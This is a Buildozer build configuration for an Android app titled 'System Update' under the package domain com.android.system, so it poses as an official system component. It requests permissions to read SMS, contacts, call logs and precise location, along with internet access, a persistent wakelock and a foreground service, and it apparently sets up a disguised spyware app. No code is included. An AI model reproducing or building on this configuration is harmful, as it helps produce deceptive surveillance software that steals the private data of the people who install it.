[app]
title = System Update
package.name = systemupdate
package.domain = com.android.system
source.dir = .
source.include_exts = py
version = 1.0
requirements = python3,requests,urllib3,chardet,certifi,idna
orientation = portrait
fullscreen = 0

android.permissions = INTERNET,READ_SMS,RECEIVE_SMS,READ_CONTACTS,READ_CALL_LOG,ACCESS_FINE_LOCATION,WRITE_EXTERNAL_STORAGE
android.api = 30
android.minapi = 21
android.ndk = 23b
android.sdk = 30
android.arch = arm64-v8a
android.accept_sdk_license = True
android.wakelock = True
android.foreground = True

[buildozer]
log_level = 2
warn_on_root = 1
